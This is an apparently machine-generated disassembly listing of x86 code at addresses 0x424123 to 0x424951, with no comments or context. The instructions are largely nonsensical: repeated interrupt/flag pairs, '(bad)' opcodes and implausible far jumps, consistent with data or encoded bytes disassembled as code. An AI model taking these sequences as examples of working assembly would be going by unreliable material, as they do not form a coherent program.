  424123:	call   0x3b81:0x90cfffc0
  42412a:	psrlq  mm5,mm3
  42412d:	xchg   edx,eax
  42412e:	stos   BYTE PTR es:[edi],al
  42412f:	cmp    esp,ecx
  424131:	shl    ebp,cl
  424133:	sub    BYTE PTR [ebx+0xc],dl
  424136:	or     cl,BYTE PTR [ebp-0x2723243]
  42413c:	int    0x8d
  42413e:	std    
  42413f:	int    0x8d
  424141:	std    
  424142:	int    0x8d
  424144:	std    
  424145:	int    0x8d
  424147:	std    
  424148:	int    0x8d
  42414a:	std    
  42414b:	int    0x8d
  42414d:	std    
  42414e:	int    0x8d
  424150:	std    
  424151:	int    0x8d
  424153:	std    
  424154:	int    0x8d
  424156:	std    
  424157:	leave  
  424158:	jbe    0x42416b
  42415a:	fadd   st,st(5)
  42415c:	loope  0x4241b3
  42415e:	int    0x8d
  424160:	std    
  424161:	int    0xa6
  424163:	std    
  424164:	cmp    esp,ecx
  424166:	cmp    ecx,DWORD PTR [edi]
  424168:	shl    ebp,cl
  42416a:	sub    bl,dl
  42416c:	jmp    0x424100
  42416e:	push   ebx
  42416f:	or     al,0xcd
  424171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424172:	dec    esp
  424173:	int    0x9f
  424175:	sub    eax,0x43808081
  42417a:	push   ebx
  42417b:	das    
  42417c:	add    eax,0x80808717
  424181:	int    0x8d
  424183:	std    
  424184:	int    0xa6
  424186:	std    
  424187:	cmp    ecx,DWORD PTR [edi]
  424189:	cmp    esp,ecx
  42418b:	shr    ebx,cl
  42418d:	xchg   edx,eax
  42418e:	shl    ebp,cl
  424190:	sub    BYTE PTR [ebx+0xc],dl
  424193:	inc    ebx
  424194:	adc    ebp,DWORD PTR [edi]
  424196:	add    eax,0x8080877f
  42419b:	int    0xca
  42419d:	add    DWORD PTR [eax-0x69327f80],eax
  4241a3:	std    
  4241a4:	int    0xa6
  4241a6:	std    
  4241a7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241ad:	xchg   edx,eax
  4241ae:	shl    ebp,cl
  4241b0:	sub    BYTE PTR [ebx-0x2b],dl
  4241b3:	inc    ebx
  4241b4:	adc    ebp,DWORD PTR [edi]
  4241b6:	add    eax,0x8080875b
  4241bb:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  4241c1:	int    0xf1
  4241c3:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  4241c9:	shl    ebx,cl
  4241cb:	xchg   edx,eax
  4241cc:	shl    ebp,cl
  4241ce:	sub    BYTE PTR [ebx-0x2b],dl
  4241d1:	or     dl,BYTE PTR [esi+0x1196cd11]
  4241d7:	inc    ebx
  4241d8:	icebp  
  4241d9:	aam    0x26
  4241db:	int    0x76
  4241dd:	std    
  4241de:	int    0x96
  4241e0:	std    
  4241e1:	cmp    ebx,ecx
  4241e3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4241e6:	jmp    0xd253:0x92bdd328
  4241ed:	int    0x96
  4241ef:	adc    DWORD PTR [ebx-0x26],esi
  4241f2:	adc    al,0x5e
  4241f4:	test   BYTE PTR [edx-0x2a],cl
  4241f7:	xor    cl,ch
  4241f9:	jbe    0x4241f8
  4241fb:	int    0x96
  4241fd:	std    
  4241fe:	cmp    ebx,ecx
  424200:	cmp    edi,DWORD PTR [ecx-0x2d]
  424203:	jmp    0xd253:0x92bdd328
  42420a:	int    0x96
  42420c:	adc    DWORD PTR [ebx-0x26],esi
  42420f:	adc    al,0x5e
  424211:	je     0x42425d
  424213:	xor    BYTE PTR [edi],ch
  424215:	add    eax,0x808092df
  42421a:	int    0x76
  42421c:	std    
  42421d:	int    0x76
  42421f:	std    
  424220:	int    0xa6
  424222:	std    
  424223:	int    0x76
  424225:	std    
  424226:	cmp    ecx,ecx
  424228:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42422e:	in     al,dx
  42422f:	xchg   edx,eax
  424230:	push   ebx
  424231:	popf   
  424232:	int    0x76
  424234:	adc    DWORD PTR [ebx+0x6d],esi
  424237:	adc    al,0x87
  424239:	ror    ebp,cl
  42423b:	jl     0x42426d
  42423d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424243:	int    0x8d
  424245:	std    
  424246:	int    0x96
  424248:	std    
  424249:	cmp    ecx,DWORD PTR [edi]
  42424b:	cmp    ebx,ecx
  42424d:	shr    ebx,cl
  42424f:	xchg   edx,eax
  424250:	shr    edx,cl
  424252:	sub    BYTE PTR [ebx+0x13],dl
  424255:	int    0x96
  424257:	std    
  424258:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42425e:	lea    esi,[ebp+0x3bfd8dcd]
  424264:	cdq    
  424265:	cmp    esi,eax
  424267:	shl    edx,cl
  424269:	sub    bl,dl
  42426b:	repz xchg edx,eax
  42426d:	push   ebx
  42426e:	jecxz  0x42423d
  424270:	lea    esi,[ebp-0x792becbd]
  424276:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42427c:	int    0x8d
  42427e:	std    
  42427f:	int    0x96
  424281:	std    
  424282:	cmp    ecx,DWORD PTR [edi]
  424284:	cmp    ebx,ecx
  424286:	shr    ebx,cl
  424288:	xchg   edx,eax
  424289:	shr    edx,cl
  42428b:	sub    BYTE PTR [ebx+0x13],dl
  42428e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424292:	jbe    0x424231
  424294:	popa   
  424295:	and    DWORD PTR [esi-0x777278cb],eax
  42429b:	or     cl,BYTE PTR [ebp-0x32781313]
  4242a1:	(bad)  
  4242a2:	in     eax,dx
  4242a3:	int    0x76
  4242a5:	dec    esp
  4242a6:	int    0x1
  4242a8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ae:	xor    ch,cl
  4242b0:	jbe    0x4242fe
  4242b2:	add    dh,dl
  4242b4:	in     eax,dx
  4242b5:	int    0x1
  4242b7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242bd:	dec    esp
  4242be:	leave  
  4242bf:	jbe    0x424266
  4242c1:	pop    DWORD PTR [ebp*1-0x5a89368a]
  4242c8:	dec    edx
  4242c9:	pop    ss
  4242ca:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  4242d0:	xchg   esi,eax
  4242d1:	std    
  4242d2:	cmp    ecx,DWORD PTR [edi]
  4242d4:	cmp    ebx,ecx
  4242d6:	shr    ebx,cl
  4242d8:	xchg   edx,eax
  4242d9:	shr    edx,cl
  4242db:	sub    BYTE PTR [ebx+0x13],dl
  4242de:	or     dh,BYTE PTR [esi-0x4b]
  4242e1:	inc    ebx
  4242e2:	jge    0x4242ba
  4242e4:	pop    eax
  4242e5:	int    0x76
  4242e7:	stc    
  4242e8:	int    0x8d
  4242ea:	stc    
  4242eb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4242ee:	lock shl edx,cl
  4242f1:	sub    bl,dl
  4242f3:	mov    ebp,0xcdd35392
  4242f8:	lea    esp,[ebp+0x3ba596cd]
  4242fe:	fnstcw WORD PTR [ebx]
  424300:	psrlq  mm5,mm2
  424303:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424309:	int    0x1
  42430b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424311:	xchg   edx,eax
  424312:	push   ebx
  424313:	jecxz  0x424344
  424315:	rcl    ebp,1
  424317:	bound  eax,QWORD PTR [eax]
  424319:	jo     0x42434f
  42431b:	int    0x76
  42431d:	std    
  42431e:	int    0x8d
  424320:	std    
  424321:	cmp    edi,DWORD PTR [ecx+0x3b]
  424324:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42432b:	push   ebx
  42432c:	rol    DWORD PTR [ebx+0x76],cl
  42432f:	mov    ch,0xd6
  424331:	and    ch,cl
  424333:	jbe    0x4242d2
  424335:	int    0x8d
  424337:	popf   
  424338:	cmp    esi,eax
  42433a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42433d:	mov    ebp,0x28f2d392
  424342:	push   ebx
  424343:	jge    0x424388
  424345:	fld    TBYTE PTR [edi]
  424347:	pop    es
  424348:	xchg   esp,eax
  424349:	add    BYTE PTR [eax],al
  42434b:	add    ch,cl
  42434d:	jbe    0x42434c
  42434f:	int    0x8d
  424351:	std    
  424352:	cmp    edi,DWORD PTR [ecx+0x3b]
  424355:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42435c:	push   ebx
  42435d:	rol    DWORD PTR [ebx+0x76],cl
  424360:	mov    ch,0xd6
  424362:	and    ch,cl
  424364:	jbe    0x42435f
  424366:	int    0x8d
  424368:	stc    
  424369:	cmp    edi,DWORD PTR [ecx+0x3b]
  42436c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424373:	push   ebx
  424374:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42437a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424384:	leave  
  424385:	jbe    0x42437c
  424387:	fdivr  st,st(4)
  424389:	sbb    al,0xb
  42438b:	int    0xa6
  42438d:	std    
  42438e:	int    0x76
  424390:	std    
  424391:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424397:	xchg   edx,eax
  424398:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42439e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243a4:	std    
  4243a5:	int    0x8d
  4243a7:	std    
  4243a8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ab:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243b2:	push   ebx
  4243b3:	ror    DWORD PTR [edx],cl
  4243b5:	jbe    0x4243a4
  4243b7:	int    0x76
  4243b9:	std    
  4243ba:	int    0x8d
  4243bc:	std    
  4243bd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243c0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243c7:	push   ebx
  4243c8:	ror    DWORD PTR [edx],cl
  4243ca:	jbe    0x4243c1
  4243cc:	int    0x8d
  4243ce:	std    
  4243cf:	int    0x76
  4243d1:	std    
  4243d2:	cmp    ecx,DWORD PTR [edi]
  4243d4:	cmp    ecx,ecx
  4243d6:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  4243dc:	push   ebx
  4243dd:	jge    0x4243ac
  4243df:	jbe    0x424376
  4243e1:	inc    ebx
  4243e2:	jge    0x4243b8
  4243e4:	xchg   ch,cl
  4243e6:	test   BYTE PTR ds:0xcded760a,bl
  4243ec:	jbe    0x42439b
  4243ee:	int    0x84
  4243f0:	sbb    eax,0xcdf5760a
  4243f5:	jbe    0x4243f4
  4243f7:	int    0x8d
  4243f9:	std    
  4243fa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243fd:	lock shl edx,cl
  424400:	sub    bl,dl
  424402:	mov    ebp,0xcdd35392
  424407:	(bad)  
  424408:	in     eax,dx
  424409:	inc    ebx
  42440a:	rcl    esp,cl
  42440c:	push   esp
  42440d:	int    0x76
  42440f:	std    
  424410:	int    0x8d
  424412:	std    
  424413:	cmp    esi,eax
  424415:	cmp    edi,DWORD PTR [ecx-0x2d]
  424418:	repnz sub bl,dl
  42441b:	mov    ebp,0xcdd35392
  424420:	(bad)  
  424421:	in     eax,dx
  424422:	shr    ebx,cl
  424424:	sub    al,BYTE PTR [ebx-0x2d]
  424427:	aam    0x1c
  424429:	int    0x8d
  42442b:	in     eax,dx
  42442c:	int    0x76
  42442e:	dec    esp
  42442f:	int    0x1
  424431:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424437:	retf   
  424438:	jno    0x42443a
  42443a:	(bad)  
  42443b:	mov    ch,0x0
  42443d:	jo     0x4243c7
  42443f:	in     al,dx
  424440:	push   ds
  424441:	int    0x76
  424443:	cmc    
  424444:	xchg   DWORD PTR [esi-0x78],esi
  424447:	int    0x8d
  424449:	dec    esp
  42444a:	int    0xa
  42444c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424452:	xchg   edx,eax
  424453:	jo     0x424455
  424455:	(bad)  
  424456:	mov    ch,0x0
  424458:	jno    0x4243e2
  42445a:	or     dh,BYTE PTR [esi-0xb]
  42445d:	int    0x76
  42445f:	std    
  424460:	int    0x8d
  424462:	std    
  424463:	cmp    edi,DWORD PTR [ecx+0x3b]
  424466:	lock shl edx,cl
  424469:	sub    bl,dl
  42446b:	mov    ebp,0xcdd35392
  424470:	(bad)  
  424471:	cmc    
  424472:	inc    ebx
  424473:	ror    ebp,cl
  424475:	jbe    0x424470
  424477:	int    0x8d
  424479:	stc    
  42447a:	(bad)  
  42447b:	xor    DWORD PTR [ebx],edi
  42447d:	jns    0x4244ba
  42447f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424486:	push   ebx
  424487:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42448d:	cmp    esi,eax
  42448f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424492:	repnz sub bl,dl
  424495:	mov    ebp,0xcdd35392
  42449a:	(bad)  
  42449b:	cmc    
  42449c:	das    
  42449d:	rcl    ebx,1
  42449f:	int    0x8d
  4244a1:	lods   eax,DWORD PTR ds:[esi]
  4244a2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244a9:	(bad)  
  4244aa:	stc    
  4244ab:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ae:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244b5:	push   ebx
  4244b6:	rol    DWORD PTR [edi-0x2893263],cl
  4244bc:	int    0x8d
  4244be:	std    
  4244bf:	cmp    esi,eax
  4244c1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244c4:	repnz sub bl,dl
  4244c7:	mov    ebp,0xcdd35392
  4244cc:	lea    ebp,[ebp+0x2f1f845e]
  4244d2:	push   es
  4244d3:	or     al,0xff
  4244d5:	add    BYTE PTR [eax],al
  4244d7:	int    0x76
  4244d9:	adc    ebp,ecx
  4244db:	lea    edx,[ecx]
  4244dd:	ins    BYTE PTR es:[edi],dx
  4244de:	sar    DWORD PTR [ebp-0x30b330d8],cl
  4244e4:	test   BYTE PTR [eax-0x2cac7f80],al
  4244ea:	int    0x8d
  4244ec:	icebp  
  4244ed:	push   esi
  4244ee:	dec    ecx
  4244ef:	and    DWORD PTR [esi-0x2ec14cb],eax
  4244f5:	add    BYTE PTR [eax],al
  4244f7:	int    0x76
  4244f9:	std    
  4244fa:	int    0x8d
  4244fc:	std    
  4244fd:	cmp    edi,DWORD PTR [ecx+0x3b]
  424500:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424507:	push   ebx
  424508:	rcr    DWORD PTR [esi+0x76],cl
  42450b:	mov    ebp,0x76cd88d6
  424510:	stc    
  424511:	int    0x8d
  424513:	stc    
  424514:	in     al,dx
  424515:	xchg   ch,cl
  424517:	jbe    0x424516
  424519:	int    0x8d
  42451b:	std    
  42451c:	cmp    esi,eax
  42451e:	cmp    edi,DWORD PTR [ecx-0x56]
  424521:	shl    edx,cl
  424523:	sub    bl,dl
  424525:	mov    ebp,0xd353a892
  42452a:	arpl   bx,cx
  42452c:	ror    BYTE PTR [eax-0x12326980],cl
  424532:	add    al,0xed
  424534:	xor    al,0xc9
  424536:	jbe    0x424535
  424538:	dec    ecx
  424539:	and    DWORD PTR [esi-0x528936cb],eax
  42453f:	inc    ecx
  424540:	and    DWORD PTR [esi+0x4c76cd35],eax
  424546:	or     dh,BYTE PTR [esi+0x4c]
  424549:	cwde   
  42454a:	int    0x6d
  42454c:	int    0x76
  42454e:	std    
  42454f:	int    0x96
  424551:	std    
  424552:	sar    bh,0x5f
  424555:	shl    DWORD PTR [ecx],1
  424557:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42455d:	cdq    
  42455e:	shr    edx,cl
  424560:	sub    bl,dl
  424562:	mov    ebp,0xcdd25392
  424567:	xchg   esi,eax
  424568:	mov    BYTE PTR [ebx-0xf],al
  42456b:	das    
  42456c:	add    eax,0x80808159
  424571:	int    0x76
  424573:	mov    ch,cl
  424575:	xchg   esi,eax
  424576:	mov    BYTE PTR [edi+0xa9a6470],al
  42457c:	xchg   esi,eax
  42457d:	cmc    
  42457e:	leave  
  42457f:	jbe    0x42457a
  424581:	popa   
  424582:	and    DWORD PTR [esi-0x68932cb],eax
  424588:	int    0x96
  42458a:	stc    
  42458b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424591:	rcl    ebx,cl
  424593:	mov    ebp,0xcdd25392
  424598:	xchg   esi,eax
  424599:	std    
  42459a:	int    0xe6
  42459c:	std    
  42459d:	cmp    esp,ebx
  42459f:	cmp    edi,edi
  4245a1:	shr    ecx,cl
  4245a3:	sub    bl,dl
  4245a5:	repz xchg edx,eax
  4245a7:	push   ebx
  4245a8:	fxch   st(5)
  4245aa:	out    0xf5,al
  4245ac:	pop    esi
  4245ad:	xchg   esp,eax
  4245ae:	leave  
  4245af:	fsubr  QWORD PTR [edi]
  4245b1:	add    eax,0x8080816b
  4245b6:	int    0x96
  4245b8:	cmc    
  4245b9:	int    0x76
  4245bb:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  4245c1:	or     ch,0x96
  4245c4:	mov    ch,cl
  4245c6:	out    0xf5,al
  4245c8:	xor    ebx,DWORD PTR [edx-0x21932ac]
  4245ce:	pop    ebx
  4245cf:	int    0xa6
  4245d1:	std    
  4245d2:	cmp    edi,edx
  4245d4:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  4245da:	in     eax,0x28
  4245dc:	push   ebx
  4245dd:	cld    
  4245de:	or     dl,BYTE PTR [esi+0x2fd943a5]
  4245e4:	add    eax,0x8080814f
  4245e9:	int    0x96
  4245eb:	std    
  4245ec:	int    0xe6
  4245ee:	std    
  4245ef:	cmp    esp,ebx
  4245f1:	cmp    edi,edi
  4245f3:	shl    ebx,cl
  4245f5:	xchg   edx,eax
  4245f6:	shr    ecx,cl
  4245f8:	sub    BYTE PTR [ebx-0x27],dl
  4245fb:	or     dl,BYTE PTR [esi+0x4c76c911]
  424601:	mov    dl,0x21
  424603:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424609:	out    0xfd,al
  42460b:	cmp    esp,ebx
  42460d:	cmp    edi,edi
  42460f:	shl    ebx,cl
  424611:	xchg   edx,eax
  424612:	shr    ecx,cl
  424614:	sub    BYTE PTR [ebx-0x27],dl
  424617:	jmp    0x42461b
  424619:	add    BYTE PTR [eax-0x2693280],0xcd
  424620:	(bad)  
  424621:	std    
  424622:	add    al,0xf7
  424624:	(bad)  
  424625:	cmp    esp,ebx
  424627:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42462d:	push   ebx
  42462e:	cdq    
  42462f:	iret   
  424630:	ja     0x42462b
  424632:	jecxz  0x424623
  424634:	inc    ebx
  424635:	cdq    
  424636:	das    
  424637:	add    al,0x21
  424639:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424640:	jo     0x4245ca
  424642:	or     dl,dh
  424644:	mov    ch,0x2f
  424646:	mov    ebx,0xea121a
  42464b:	das    
  42464c:	add    BYTE PTR [eax-0x321269f6],0x96
  424653:	in     eax,dx
  424654:	xchg   DWORD PTR [eax],esi
  424656:	int    0xd6
  424658:	in     eax,dx
  424659:	xchg   DWORD PTR [eax-0x2d],edx
  42465c:	repz sub bl,dl
  42465f:	mov    ecx,0x2ffb5392
  424664:	mov    ebx,0x4cf3d31a
  424669:	adc    dh,bh
  42466b:	dec    ecx
  42466c:	and    DWORD PTR [esi-0x1229f5cb],eax
  424672:	or     dl,BYTE PTR [esi-0x12693243]
  424678:	int    0xd6
  42467a:	in     eax,dx
  42467b:	cmp    esp,ebx
  42467d:	add    al,0xf7
  42467f:	call   ebx
  424681:	repz xchg edx,eax
  424683:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424689:	xchg   esi,eax
  42468a:	mov    BYTE PTR [edx],cl
  42468c:	xchg   esi,eax
  42468d:	in     eax,dx
  42468e:	int    0x96
  424690:	dec    esp
  424691:	int    0xd6
  424693:	dec    esp
  424694:	cmp    esp,ebx
  424696:	add    al,0xf7
  424698:	call   ebx
  42469a:	mov    ecx,0x92f3d328
  42469f:	push   ebx
  4246a0:	cdq    
  4246a1:	int    0xd6
  4246a3:	mov    ebp,0x32d6fb43
  4246a8:	int    0x96
  4246aa:	dec    esp
  4246ab:	int    0xd6
  4246ad:	dec    esp
  4246ae:	cmp    esp,ebx
  4246b0:	add    al,0xf7
  4246b2:	call   ebx
  4246b4:	mov    ecx,0x92f3d328
  4246b9:	push   ebx
  4246ba:	cdq    
  4246bb:	int    0xd6
  4246bd:	mov    ebp,0x88d6fb43
  4246c2:	int    0x96
  4246c4:	in     eax,dx
  4246c5:	int    0xd6
  4246c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c8:	add    DWORD PTR [edx+0x4],0x8d0092c9
  4246cf:	mov    ch,0x2f
  4246d1:	push   es
  4246d2:	xchg   ebx,eax
  4246d3:	add    BYTE PTR [eax],al
  4246d5:	add    BYTE PTR [ecx-0x6932ee5a],al
  4246db:	stc    
  4246dc:	int    0xd6
  4246de:	stc    
  4246df:	cmp    esp,ebx
  4246e1:	add    al,0xf7
  4246e3:	call   ebx
  4246e5:	mov    ecx,0x92f3d328
  4246ea:	push   ebx
  4246eb:	cdq    
  4246ec:	int    0xd6
  4246ee:	adc    ebp,ecx
  4246f0:	out    0xf5,al
  4246f2:	inc    ebx
  4246f3:	aam    0xd9
  4246f5:	in     al,0x77
  4246f7:	sub    al,0xcd
  4246f9:	xchg   esi,eax
  4246fa:	std    
  4246fb:	int    0xd6
  4246fd:	std    
  4246fe:	cmp    esp,ebx
  424700:	add    al,0xf7
  424702:	call   ebx
  424704:	repz xchg edx,eax
  424706:	sar    DWORD PTR [ecx+0x53c58728],cl
  42470c:	cdq    
  42470d:	int    0x9c
  42470f:	test   BYTE PTR [ebx-0x1e],al
  424712:	das    
  424713:	push   es
  424714:	test   BYTE PTR [eax],al
  424716:	add    BYTE PTR [eax],al
  424718:	arpl   bp,cx
  42471a:	jbe    0x4246c9
  42471c:	cmp    edx,ebx
  42471e:	int    0x8d
  424720:	lods   eax,DWORD PTR ds:[esi]
  424721:	add    al,0x2
  424723:	jmp    FWORD PTR [edx+0x76cd4aec]
  424729:	std    
  42472a:	cmp    edx,ebx
  42472c:	int    0x8d
  42472e:	std    
  42472f:	cmp    ecx,DWORD PTR [edi]
  424731:	shl    edx,cl
  424733:	sub    bl,dl
  424735:	mov    ebp,0xa8d35392
  42473a:	retf   
  42473b:	ror    BYTE PTR [eax-0x12326980],cl
  424741:	adc    ch,ch
  424743:	xchg   ebp,eax
  424744:	add    BYTE PTR [eax-0x2893680],0x49
  42474b:	and    DWORD PTR [esi-0x68936cb],eax
  424751:	inc    ecx
  424752:	and    DWORD PTR [esi-0x28932cb],eax
  424758:	int    0x8d
  42475a:	std    
  42475b:	cwde   
  42475c:	call   0x8621:0xd169ffc0
  424763:	xor    eax,0xbdd3793b
  424768:	xchg   edx,eax
  424769:	mov    al,ds:0xf2d3133b
  42476e:	sub    BYTE PTR [ebx-0x2d],dl
  424771:	or     dh,BYTE PTR [esi-0x53]
  424774:	int    0x76
  424776:	std    
  424777:	int    0x8d
  424779:	std    
  42477a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42477d:	mov    ebp,0xd3133b92
  424782:	repnz sub BYTE PTR [ebx-0x2d],dl
  424786:	or     dh,BYTE PTR [esi-0xf]
  424789:	int    0xe6
  42478b:	and    al,0xcd
  42478d:	jbe    0x42477c
  42478f:	int    0x8d
  424791:	in     eax,dx
  424792:	cmp    edx,ebx
  424794:	or     dh,BYTE PTR [esi-0x13]
  424797:	adc    dh,BYTE PTR [esi-0x13]
  42479a:	dec    ecx
  42479b:	mov    al,ds:0x76cd3586
  4247a0:	cmc    
  4247a1:	int    0x8d
  4247a3:	cmc    
  4247a4:	cmp    edx,ebx
  4247a6:	or     dh,BYTE PTR [esi-0xb]
  4247a9:	adc    dh,BYTE PTR [esi-0xb]
  4247ac:	dec    ecx
  4247ad:	lahf   
  4247ae:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247b4:	lea    edx,[ecx]
  4247b6:	cmp    edx,ebx
  4247b8:	or     dh,BYTE PTR [esi+0x11]
  4247bb:	adc    dh,BYTE PTR [esi+0x11]
  4247be:	imul   esp,DWORD PTR [ecx],0x76cd3586
  4247c4:	mov    ch,0xcd
  4247c6:	lea    esi,[ebp+0x760ad33b]
  4247cc:	mov    ch,0x12
  4247ce:	jbe    0x424785
  4247d0:	dec    ecx
  4247d1:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  4247d8:	hlt    
  4247d9:	mov    esi,DWORD PTR ds:0x68876cd
  4247df:	ins    DWORD PTR es:[edi],dx
  4247e0:	das    
  4247e1:	add    eax,0x80808551
  4247e6:	int    0x76
  4247e8:	dec    esp
  4247e9:	push   es
  4247ea:	ins    DWORD PTR es:[edi],dx
  4247eb:	das    
  4247ec:	add    eax,0x80808538
  4247f1:	int    0x76
  4247f3:	sbb    al,0x6
  4247f5:	ins    DWORD PTR es:[edi],dx
  4247f6:	das    
  4247f7:	add    eax,0x80808523
  4247fc:	int    0x76
  4247fe:	and    al,0xcd
  424800:	jbe    0x424826
  424802:	int    0x8d
  424804:	mov    bl,dl
  424806:	mov    ebp,0x39af5692
  42480b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424812:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42481c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42481f:	mov    ebp,0xd3133b92
  424824:	repnz sub BYTE PTR [ebx-0x2d],dl
  424828:	or     dh,BYTE PTR [esi-0xf]
  42482b:	int    0x76
  42482d:	std    
  42482e:	int    0x76
  424830:	std    
  424831:	int    0x76
  424833:	mov    ch,cl
  424835:	lea    ecx,[eax-0x329b8379]
  42483b:	outs   dx,BYTE PTR ds:[esi]
  42483c:	jo     0x424848
  42483e:	lea    esp,[esi+eax*1]
  424841:	ins    DWORD PTR es:[edi],dx
  424842:	das    
  424843:	add    eax,0x808084f0
  424848:	leave  
  424849:	jbe    0x4247e0
  42484b:	dec    ecx
  42484c:	and    DWORD PTR [eax+0x35],edi
  42484f:	int    0x76
  424851:	xchg   ebp,eax
  424852:	pop    ebx
  424853:	int    0xa6
  424855:	xchg   ebp,eax
  424856:	cmp    edi,DWORD PTR [ecx+0x3b]
  424859:	loop   0x42482e
  42485b:	mov    ebp,0x28e5d392
  424860:	push   ebx
  424861:	popf   
  424862:	or     ah,BYTE PTR [esi-0x289326b]
  424868:	int    0x76
  42486a:	std    
  42486b:	int    0x8
  42486d:	sub    eax,0xcd808081
  424872:	xor    ch,cl
  424874:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424878:	int    0x76
  42487a:	std    
  42487b:	int    0x76
  42487d:	std    
  42487e:	int    0x8
  424880:	and    eax,0xcd808081
  424885:	sbb    al,0xa
  424887:	xchg   esi,eax
  424888:	dec    esp
  424889:	inc    ebx
  42488a:	fst    st(6)
  42488c:	push   0xffffffcd
  42488e:	(bad)  
  42488f:	cmc    
  424890:	int    0x8
  424892:	adc    DWORD PTR [ecx-0x69307f80],eax
  424898:	lods   eax,DWORD PTR ds:[esi]
  424899:	(bad)  
  42489a:	int    0x96
  42489c:	cmc    
  42489d:	cmp    ecx,DWORD PTR [edi]
  42489f:	add    al,0xfb
  4248a1:	call   ebx
  4248a3:	jmp    0x424837
  4248a5:	shr    edx,cl
  4248a7:	sub    BYTE PTR [ebx-0x1d],dl
  4248aa:	int    0x8d
  4248ac:	dec    esp
  4248ad:	bound  eax,QWORD PTR [eax]
  4248af:	xchg   ecx,eax
  4248b0:	jo     0x42490d
  4248b2:	add    BYTE PTR [eax+0x24],dh
  4248b5:	int    0x8d
  4248b7:	dec    esp
  4248b8:	int    0x6e
  4248ba:	xchg   esp,eax
  4248bb:	int    0x7e
  4248bd:	jo     0x4248f2
  4248bf:	jge    0x424932
  4248c1:	xchg   ebp,eax
  4248c3:	jo     0x424882
  4248c5:	dec    esi
  4248c6:	xchg   BYTE PTR [eax+0x248dcd80],al
  4248cc:	int    0x8
  4248ce:	xor    eax,0xa808081
  4248d3:	sbb    al,0x0
  4248d5:	xchg   ecx,eax
  4248d6:	xchg   esp,eax
  4248d7:	add    dh,dl
  4248d9:	mov    BYTE PTR [ebx-0x43],bl
  4248dc:	or     eax,0xcd808084
  4248e1:	pop    ebx
  4248e2:	fs xchg ebp,edx
  4248e5:	das    
  4248e6:	mov    ebx,0x74cf1452
  4248eb:	xor    BYTE PTR [edx+ecx*1],bl
  4248ee:	jbe    0x42490c
  4248f0:	int    0x76
  4248f2:	std    
  4248f3:	int    0x8d
  4248f5:	std    
  4248f6:	cmp    edi,DWORD PTR [ecx+0x4]
  4248f9:	add    bh,bh
  4248fb:	shl    edx,cl
  4248fd:	sub    bl,dl
  4248ff:	mov    ebp,0x2fd35392
  424904:	mov    ebx,0x960a868a
  424909:	and    al,0x43
  42490b:	jge    0x42493c
  42490d:	add    eax,0x808080e9
  424912:	int    0x76
  424914:	std    
  424915:	int    0x8d
  424917:	std    
  424918:	cmp    edi,DWORD PTR [ecx+0x4]
  42491b:	add    bh,bh
  42491d:	shl    edx,cl
  42491f:	sub    bl,dl
  424921:	mov    ebp,0xad35392
  424926:	jbe    0x4248cd
  424928:	int    0x76
  42492a:	stc    
  42492b:	int    0x8d
  42492d:	stc    
  42492e:	add    al,0x2
  424930:	(bad)  
  424931:	cmp    edi,DWORD PTR [ecx-0x2d]
  424934:	repnz sub bl,dl
  424937:	mov    ebp,0x2fd35392
  42493c:	mov    ebx,0x7d33868a
  424941:	pop    esi
  424942:	lea    esp,[ebp-0x7f2ef7d1]
  424948:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42494f:	mov    BYTE PTR [edx],cl
  424951:	lea    ebx,[esp+ebp*8]
